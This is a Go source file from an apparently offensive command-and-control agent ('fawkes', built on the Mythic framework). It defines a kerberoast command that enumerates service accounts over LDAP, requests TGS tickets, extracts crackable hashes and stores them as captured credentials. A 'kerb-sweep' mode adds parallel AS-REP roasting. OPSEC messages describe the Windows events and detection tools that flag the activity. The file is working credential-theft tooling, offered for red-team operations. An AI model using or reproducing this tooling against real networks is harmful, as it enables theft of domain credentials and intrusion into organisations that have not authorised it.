package agentfunctions

import (
	"encoding/json"
	"fmt"
	"path/filepath"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "kerberoast",
		Description:         "Request TGS tickets for SPN accounts and extract hashes for offline cracking. Auto-enumerates kerberoastable accounts via LDAP or targets a specific SPN.",
		HelpString:          "kerberoast -server 192.168.1.1 -username user@domain.local -password pass\nkerberoast -server dc01 -realm DOMAIN.LOCAL -username user@domain.local -password pass -spn MSSQLSvc/srv.domain.local",
		Version:             2,
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1558.003", "T1558.004"},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{
				agentstructs.SUPPORTED_OS_WINDOWS,
				agentstructs.SUPPORTED_OS_LINUX,
				agentstructs.SUPPORTED_OS_MACOS,
			},
			CommandCanOnlyBeLoadedLater: true,
		},
		AssociatedBrowserScript: &agentstructs.BrowserScript{ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "kerberoast_new.js"), Author: "@galoryber"},
		TaskCompletionFunctions: map[string]agentstructs.PTTaskCompletionFunction{
			"kerbSweepComplete": kerbSweepComplete,
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "action",
				CLIName:          "action",
				ModalDisplayName: "Action",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"roast", "kerb-sweep"},
				Description:      "roast: standard kerberoasting. kerb-sweep: parallel kerberoast + AS-REP roast sweep.",
				DefaultValue:     "roast",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:                 "server",
				CLIName:              "server",
				ModalDisplayName:     "Domain Controller",
				Description:          "KDC / Domain Controller IP or hostname",
				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:         "",
				DynamicQueryFunction: getActiveHostList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default"},
				},
			},
			{
				Name:                 "username",
				CLIName:              "username",
				ModalDisplayName:     "Username",
				Description:          "Domain user for authentication (UPN format: user@domain.local)",
				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:         "",
				DynamicQueryFunction: getCallbackUserList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default"},
				},
			},
			{
				Name:             "password",
				CLIName:          "password",
				ModalDisplayName: "Password",
				Description:      "Domain user password",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default"},
				},
			},
			{
				Name:             "realm",
				CLIName:          "realm",
				ModalDisplayName: "Realm",
				Description:      "Kerberos realm (auto-detected from username UPN if empty)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "spn",
				CLIName:          "spn",
				ModalDisplayName: "Target SPN",
				Description:      "Specific SPN to roast (if empty, auto-enumerates all kerberoastable accounts via LDAP)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "port",
				CLIName:          "port",
				ModalDisplayName: "LDAP Port",
				Description:      "LDAP port for SPN enumeration (default: 389)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				DefaultValue:     389,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "base_dn",
				CLIName:          "base_dn",
				ModalDisplayName: "Base DN",
				Description:      "LDAP search base for SPN enumeration (auto-detected if empty)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "use_tls",
				CLIName:          "use_tls",
				ModalDisplayName: "Use LDAPS",
				Description:      "Use TLS/LDAPS for SPN enumeration",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
				DefaultValue:     false,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			var entries []struct {
				Account string `json:"account"`
				SPN     string `json:"spn"`
				Etype   string `json:"etype"`
				Hash    string `json:"hash"`
				Status  string `json:"status"`
			}
			if err := json.Unmarshal([]byte(responseText), &entries); err != nil {
				return response
			}
			var creds []mythicrpc.MythicRPCCredentialCreateCredentialData
			realm := processResponse.TaskData.Callback.Host
			for _, e := range entries {
				if e.Status != "roasted" || e.Hash == "" {
					continue
				}
				creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
					CredentialType: "hash",
					Realm:          realm,
					Account:        e.Account,
					Credential:     e.Hash,
					Comment:        fmt.Sprintf("kerberoast (%s) SPN: %s", e.Etype, e.SPN),
				})
			}
			registerCredentials(processResponse.TaskData.Task.ID, creds)
			if len(creds) > 0 {
				logOperationEvent(processResponse.TaskData.Task.ID,
					fmt.Sprintf("[CREDENTIAL] kerberoast extracted %d TGS hashes from %s", len(creds), processResponse.TaskData.Callback.Host), true)
			}
			return response
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID:             taskData.Task.ID,
				Success:            true,
				OpsecPreBlocked:    false,
				OpsecPreMessage:    "OPSEC WARNING: Kerberoasting requests TGS tickets for service accounts (SPN enumeration + TGS-REQ). Generates Kerberos Event ID 4769 with encryption type 0x17 (RC4). Modern detection tools (e.g., Microsoft ATA, CrowdStrike) specifically alert on RC4 TGS requests from non-service accounts.",
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
				TaskID:              taskData.Task.ID,
				Success:             true,
				OpsecPostBlocked:    false,
				OpsecPostMessage:    "OPSEC AUDIT: Kerberoast TGS tickets requested. Kerberos Event ID 4769 entries now exist on the domain controller with RC4 encryption type (0x17). These are high-confidence indicators — review and rotate any cracked service account passwords. Clear Kerberos ticket cache on the host if needed.",
				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}

			action, _ := taskData.Args.GetStringArg("action")
			server, _ := taskData.Args.GetStringArg("server")
			spn, _ := taskData.Args.GetStringArg("spn")

			if action == "kerb-sweep" {
				// Parallel kerberoast + AS-REP roast sweep
				display := fmt.Sprintf("Kerberos Credential Sweep on %s (kerberoast + asrep-roast)", server)
				response.DisplayParams = &display

				// Build shared parameters for both subtasks
				username, _ := taskData.Args.GetStringArg("username")
				password, _ := taskData.Args.GetStringArg("password")
				realm, _ := taskData.Args.GetStringArg("realm")
				port, _ := taskData.Args.GetNumberArg("port")
				baseDN, _ := taskData.Args.GetStringArg("base_dn")
				useTLS, _ := taskData.Args.GetBooleanArg("use_tls")

				sharedParams := map[string]interface{}{
					"server":   server,
					"username": username,
					"password": password,
					"realm":    realm,
					"port":     port,
					"base_dn":  baseDN,
					"use_tls":  useTLS,
				}

				kerbParams, _ := json.Marshal(sharedParams)
				asrepParams, _ := json.Marshal(sharedParams)

				completionFunc := "kerbSweepComplete"
				tasks := []mythicrpc.MythicRPCTaskCreateSubtaskGroupTasks{
					{CommandName: "kerberoast", Params: string(kerbParams)},
					{CommandName: "asrep-roast", Params: string(asrepParams)},
				}

				_, err := mythicrpc.SendMythicRPCTaskCreateSubtaskGroup(
					mythicrpc.MythicRPCTaskCreateSubtaskGroupMessage{
						TaskID:                taskData.Task.ID,
						GroupName:             "kerb_sweep_chain",
						GroupCallbackFunction: &completionFunc,
						Tasks:                 tasks,
					},
				)
				if err != nil {
					response.Success = false
					errMsg := fmt.Sprintf("Failed to create kerb-sweep subtasks: %v", err)
					response.Error = errMsg
					return response
				}

				createArtifact(taskData.Task.ID, "Subtask Chain",
					fmt.Sprintf("Kerberos Credential Sweep: kerberoast + asrep-roast on %s (parallel)", server))
				return response
			}

			// Standard kerberoast action
			displayMsg := fmt.Sprintf("Kerberoast %s", server)
			if spn != "" {
				displayMsg += fmt.Sprintf(" SPN=%s", spn)
			} else {
				displayMsg += " (auto-enumerate SPNs)"
			}
			response.DisplayParams = &displayMsg

			createArtifact(taskData.Task.ID, "API Call", fmt.Sprintf("Kerberos TGS request for SPN roasting on %s", server))

			return response
		},
	})
}

// kerbSweepComplete aggregates results from parallel kerberoast + asrep-roast subtasks.
func kerbSweepComplete(
	taskData *agentstructs.PTTaskMessageAllData,
	subtaskData *agentstructs.PTTaskMessageAllData,
	groupName *agentstructs.SubtaskGroupName,
) agentstructs.PTTaskCompletionFunctionMessageResponse {
	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
		TaskID:  taskData.Task.ID,
		Success: true,
	}

	parentID := taskData.Task.ID
	searchResult, err := mythicrpc.SendMythicRPCTaskSearch(mythicrpc.MythicRPCTaskSearchMessage{
		TaskID:             parentID,
		SearchParentTaskID: &parentID,
	})

	var summaryParts []string
	totalHashes := 0
	successCount := 0
	errorCount := 0

	if err == nil && searchResult.Success {
		for _, task := range searchResult.Tasks {
			status := "UNKNOWN"
			if task.Completed {
				if task.Status == "error" {
					status = "ERROR"
					errorCount++
				} else {
					status = "SUCCESS"
					successCount++
				}
			}

			summaryParts = append(summaryParts, fmt.Sprintf("[%s] %s: %s", status, task.CommandName, task.DisplayParams))

			// Count hashes from each subtask response
			respSearch, respErr := mythicrpc.SendMythicRPCResponseSearch(mythicrpc.MythicRPCResponseSearchMessage{
				TaskID: task.ID,
			})
			if respErr == nil && respSearch.Success {
				for _, resp := range respSearch.Responses {
					text := string(resp.Response)
					// Count "roasted" entries in JSON output
					totalHashes += strings.Count(text, `"roasted"`)
				}
			}
		}
	}

	completed := true
	response.Completed = &completed

	summary := fmt.Sprintf("=== Kerberos Credential Sweep Complete ===\nSubtasks: %d success, %d errors\nTotal hashes extracted: %d\n\n%s",
		successCount, errorCount, totalHashes, strings.Join(summaryParts, "\n"))
	response.Stdout = &summary

	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
		TaskID:   parentID,
		Response: []byte(summary),
	})

	if totalHashes > 0 {
		logOperationEvent(parentID,
			fmt.Sprintf("[CREDENTIAL] Kerb-sweep extracted %d hashes from %s", totalHashes, taskData.Callback.Host), true)
	}

	return response
}

// kerberoastEntry represents a single Kerberoast result from agent output.
type kerberoastEntry struct {
	Account string `json:"account"`
	SPN     string `json:"spn"`
	Etype   string `json:"etype"`
	Hash    string `json:"hash"`
	Status  string `json:"status"`
}

// parseKerberoastEntries parses the JSON response from the kerberoast command.
func parseKerberoastEntries(responseText string) ([]kerberoastEntry, error) {
	var entries []kerberoastEntry
	if err := json.Unmarshal([]byte(responseText), &entries); err != nil {
		return nil, err
	}
	return entries, nil
}

// filterRoastedEntries returns only successfully roasted entries with non-empty hashes.
func filterRoastedEntries(entries []kerberoastEntry) []kerberoastEntry {
	var roasted []kerberoastEntry
	for _, e := range entries {
		if e.Status == "roasted" && e.Hash != "" {
			roasted = append(roasted, e)
		}
	}
	return roasted
}

// countRoastedInText counts occurrences of "roasted" status in raw response text.
func countRoastedInText(text string) int {
	return strings.Count(text, `"roasted"`)
}
